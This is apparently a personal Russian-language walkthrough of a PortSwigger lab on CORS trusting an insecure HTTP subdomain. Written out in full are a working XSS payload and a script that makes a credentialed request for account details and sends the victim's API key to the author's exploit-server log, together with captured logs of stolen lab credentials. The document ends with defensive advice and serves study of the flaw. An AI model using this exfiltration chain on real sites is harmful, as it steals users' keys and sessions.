
доп теория по CORS

### Эксплуатация XSS через доверительные отношения CORS


 запрос:

`GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: https://subdomain.vulnerable-website.com Cookie: sessionid=...`

ответ:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true`

и есть субдомен уязвим для xss - то можно сделать так:

`https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>`

--------
### Разрушение TLS с плохо настроенным CORS

Предположим, что приложение, которое строго использует HTTPS, также в белый список доверенного поддомена, который использует простой HTTP. Например, когда приложение получает следующий запрос:

`GET /api/requestApiKey HTTP/1.1 Host: vulnerable-website.com Origin: http://trusted-subdomain.vulnerable-website.com Cookie: sessionid=...`

Приложение отвечает:

`HTTP/1.1 200 OK Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true`

В этой ситуации злоумышленник, который может перехватить трафик пользователя-жертвы

-------

лаба https://portswigger.net/web-security/cors/lab-breaking-https-attack
##### Уязвимость CORS в надежных, но небезопасных протоколах
сайт доверяет всем поддоменам независимо от протокола

задание:
создать скрипт для кражи апи ключа 
через переход по ссылке на мой сервер

------

есть запрос - возвращает как-раз таки апи ключ
```http
GET /accountDetails HTTP/2
Host: 0a1200e7045630e684413b54004b0016.web-security-academy.net
Cookie: session=Q6RRl4HFX238nMHZQMw11uDJ21SvTY6Y
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1200e7045630e684413b54004b0016.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

```
ответ
```http
HTTP/2 200 OK
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "AE2fHo14HySWqwkko21H79JMvGyZpKMD",
  "sessions": [
    "Q6RRl4HFX238nMHZQMw11uDJ21SvTY6Y"
  ]
}
```

внимание привлекает `Access-Control-Allow-Credentials: true`

на Origin: erfe не реагирует и не отражает
на Origin: null тоже нет реакции
Origin: web-security-academy.net  тоже нет

раз тут есть `Access-Control-Allow-Credentials: true`
значит и есть какие-то домены - которые поддерживет cors
изучу карту сайта - чтобы найти подтверждение отражения какого-либо домена в ответе!





--------



нашел!
```http
GET /academyLabHeader HTTP/2
Host: 0a1200e7045630e684413b54004b0016.web-security-academy.net
Connection: Upgrade
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Upgrade: websocket
Origin: https://0a1200e7045630e684413b54004b0016.web-security-academy.net
Sec-Websocket-Version: 13
Accept-Encoding: gzip, deflate, br
Accept-Language: ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: session=Q6RRl4HFX238nMHZQMw11uDJ21SvTY6Y
Sec-Websocket-Key: nj5Jg7ja3fQSivULGa4qSQ==


```
здесь есть
`Origin: https://0a1200e7045630e684413b54004b0016.web-security-academy.net`

теперь тоже самое подставляю в свой запрос неа получение данных


отправляю запрос 
```http
GET /accountDetails HTTP/2
Host: 0a1200e7045630e684413b54004b0016.web-security-academy.net
Cookie: session=Q6RRl4HFX238nMHZQMw11uDJ21SvTY6Y
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Origin: https://0a1200e7045630e684413b54004b0016.web-security-academy.net
Referer: https://0a1200e7045630e684413b54004b0016.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i


```

и получаю ответ с отражением
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: https://0a1200e7045630e684413b54004b0016.web-security-academy.net
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "AE2fHo14HySWqwkko21H79JMvGyZpKMD",
  "sessions": [
    "Q6RRl4HFX238nMHZQMw11uDJ21SvTY6Y"
  ]
}
```
вот ОНО: `Access-Control-Allow-Origin: https://0a1200e7045630e684413b54004b0016.web-security-academy.net`
проверил - пропускает только его и в полной конфигурации

------

заключение по мини - разведке

1 - не принимает сторонние адреса
2 - принимает только оригинальный собственный адресс сайта!

значит можно пробовать технику - при которой мы будет добавлять поддомены!!
вот как - то так  [example.com.attacker.ru]
или так 
`http://trusted-subdomain.vulnerable-website.com`


---------
#### пробую найти адресс который сервер будет считать за свой!

вот оригинал сайт - который cors пропускает
`https://0a1200e7045630e684413b54004b0016.web-security-academy.net`
а вот мой эксплойт сервер
`https://exploit-0aaa00c304db303384553a6b01d3009c.exploit-server.net/exploit`

пробую соеденинить это дело!

```go
https://0a1200e7045630e684413b54004b0016.web-security-academy.net.exploit-0aaa00c304db303384553a6b01d3009c.exploit-server.net/exploit


не сработало - не отразился в ответе

-------

https://exploit-0aaa00c304db303384553a6b01d3009c.exploit-server.net/exploit.0a1200e7045630e684413b54004b0016.web-security-academy.net

не сработало - не отразился в ответе

-------------


https://exploit-0aaa00c304db303384553a6b01d3009c.exploit-server.net/exploit#0a1200e7045630e684413b54004b0016.web-security-academy.net
нет

------

https://exploit-0aaa00c304db303384553a6b01d3009c.exploit-server.net/exploit@0a1200e7045630e684413b54004b0016.web-security-academy.net
нет

------



```

короче говоря - доверяет только 
`https://0a1200e7045630e684413b54004b0016.web-security-academy.net`!!
это просто главная страница
пробую
/product?productId=1
`https://0a1200e7045630e684413b54004b0016.web-security-academy.net/product?productId=1`!!

отлично!!
вот запрос
```http
GET /accountDetails HTTP/2
Host: 0a1200e7045630e684413b54004b0016.web-security-academy.net
Cookie: session=Q6RRl4HFX238nMHZQMw11uDJ21SvTY6Y
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Origin: https://0a1200e7045630e684413b54004b0016.web-security-academy.net/product?productId=1
Content-Length: 176

Content-Length: 1
```
ответ 
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: https://0a1200e7045630e684413b54004b0016.web-security-academy.net/product?productId=1
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "AE2fHo14HySWqwkko21H79JMvGyZpKMD",
  "sessions": [
    "Q6RRl4HFX238nMHZQMw11uDJ21SvTY6Y"
  ]
}
```
красота!!! то есть cors доверяет только собственным доменам!

есть также вот такой запрос
```http
GET /?productId=1&storeId=1 HTTP/1.1
Host: stock.0a1200e7045630e684413b54004b0016.web-security-academy.net
Cookie: session=59LD2MGO1DBRU0joDjw6ryHewB5WTDFH
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive

-------
ответ

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 16

Stock level: 810

```


---------

и даже есть вот другая стр этого сайта
```http
GET /accountDetails HTTP/2
Host: 0a1200e7045630e684413b54004b0016.web-security-academy.net
Cookie: session=Q6RRl4HFX238nMHZQMw11uDJ21SvTY6Y
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Origin: https://stock.0a1200e7045630e684413b54004b0016.web-security-academy.net/?productId=1&storeId=1
Content-Length: 176

Content-Length: 153

Referer: https://0a1200e7045630e684413b54004b0016.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

ответ

---------

HTTP/2 200 OK
Access-Control-Allow-Origin: https://stock.0a1200e7045630e684413b54004b0016.web-security-academy.net/?productId=1&storeId=1
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "AE2fHo14HySWqwkko21H79JMvGyZpKMD",
  "sessions": [
    "Q6RRl4HFX238nMHZQMw11uDJ21SvTY6Y"
  ]
}

```

этот запрос странно открывается в отдельном окне...

вот ориг ссылка
`https://stock.0a1200e7045630e684413b54004b0016.web-security-academy.net/?productId=2&storeId=1`
вот тыкал в нее аллерт и нашел!

`http://stock.0a1200e7045630e684413b54004b0016.web-security-academy.net/?productId=<script>alert(1)</script>&storeId=1`

вызывается аллерт - то есть одна из страниц сайта имеет XSS !
а целевая моя страница это - GET /accountDetails HTTP/2 из нее нужно данные получить!!

значит попробую подставить этот домен с xss в Origin атакуемой страницы

запрос с xss
```http
GET /accountDetails HTTP/2
Host: 0a1200e7045630e684413b54004b0016.web-security-academy.net
Cookie: session=Q6RRl4HFX238nMHZQMw11uDJ21SvTY6Y
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Origin: http://stock.0a1200e7045630e684413b54004b0016.web-security-academy.net/?productId=<script>alert(1)</script>&storeId=1
Content-Length: 176

Content-Length: 153

Referer: https://0a1200e7045630e684413b54004b0016.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Priority: u=1, i

```
ну и ответ отразился полностью 
```http
HTTP/2 200 OK
Access-Control-Allow-Origin: http://stock.0a1200e7045630e684413b54004b0016.web-security-academy.net/?productId=<script>alert(1)</script>&storeId=1
Access-Control-Allow-Credentials: true
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 149

{
  "username": "wiener",
  "email": "",
  "apikey": "AE2fHo14HySWqwkko21H79JMvGyZpKMD",
  "sessions": [
    "Q6RRl4HFX238nMHZQMw11uDJ21SvTY6Y"
  ]
}
```

-----------

готовлю скритп - котрый стырит куки на мой сервер при переходе по ссылке на мой сайт
```js
<script>
document.location="http://stock.0a1200e7045630e684413b54004b0016.web-security-academy.net/?productId=4
<script>

var req = new XMLHttpRequest(); // создаётся объект для ajax-запроса

req.onload = reqListener; // когда придёт ответ от сервера, то - выполнится функция reqListener

req.open('get','https://0a1200e7045630e684413b54004b0016.web-security-academy.net/accountDetails',true); // настраивается get-запрос к https основному сайту на эндпоинт с апи ключом

req.withCredentials = true;req.send(); // браузер добавит куку к запросу

function reqListener() {
location='https://exploit-0aaa00c304db303384553a6b01d3009c.exploit-server.net/log?key='%2bthis.responseText; // responseText - содержит ответ сервера (json с данными)
};

%3c/script>&storeId=1"

</script>
```

логи
```c
10.0.4.48       2026-03-06 15:21:19 +0000 "GET /exploit/ HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"


10.0.4.48       2026-03-06 15:21:19 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22drR4I0YpoFLtBGM0a2YJdZMyUS8dd6Kb%22,%20%20%22sessions%22:%20[%20%20%20%20%2267SDUWuP0fAFpwDCERtcvo7Ncsk410wq%22%20%20]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"


10.0.4.48       2026-03-06 15:21:19 +0000 "GET /resources/css/labsDark.css HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```

декодирую
```c
"GET /log?key={  "username": "administrator",  "email": "",  "apikey": "drR4I0YpoFLtBGM0a2YJdZMyUS8dd6Kb",  "sessions": [    "67SDUWuP0fAFpwDCERtcvo7Ncsk410wq"  ]} HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
```
вот и апи ключ drR4I0YpoFLtBGM0a2YJdZMyUS8dd6Kb

#### лаба решена!!!!!


-------
  

#### почему получилось взломать

сервер доверял всем своим поддоменам независимо от протокола  

++ один из поддоменов работал по http и имел xss уязвимость в параметре productid

и когда жертва переходила на мой эксплойт сервер  - то я перенаправлял её на этот уязвимый поддомен с внедренным скриптом

скрипт делал запрос к https основному сайту на accountdetails с куками жертвы

так как поддомен был доверенным cors разрешал этот запрос

полученные данные с апи ключом скрипт отправлял на мой сервер где они появлялись в логах

#### как защититься

никогда не доверять поддоменам с http если основной сайт на https

использовать hsts и secure флаги для кук (HSTS это HTTP Strict Transport Security)

для cors использовать белый список конкретных доменов а не всех поддоменов

все поддомены должны проходить такую же проверку безопасности как основной сайт особенно от xss

регулярно проверять все параметры на наличие xss

если есть доверенные поддомены с http их нужно мигрировать на https

-------

